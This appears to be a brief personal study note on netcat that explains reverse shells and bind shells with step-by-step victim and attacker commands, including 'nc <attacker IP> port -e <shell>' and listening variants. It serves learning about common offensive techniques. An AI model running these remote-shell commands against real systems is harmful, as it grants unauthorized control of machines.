We use [[netcat]] (nc) to connect to a remote machine

**Reverse Shell:**
The victim is connecting back to us via an open port

Step 1
**Victim Machine** (Connecting)
```
nc  <attacker IP> port -e <shell>
```

Step 2
**Attacker Machine** (Listening)
```
nc -vlp <port>
```
![[Pasted image 20241227094930.png]]

**Bind Shell:**
The attacker  is connecting  to the victim via an open port

Step 1
**Victim Machine** (Listening)
```
nc -vlp <port> -e <shell>
```

Step 2
**Attacker Machine** (Connecting)
```
nc  <victim IP> port 
```

![[Pasted image 20241227095454.png]]
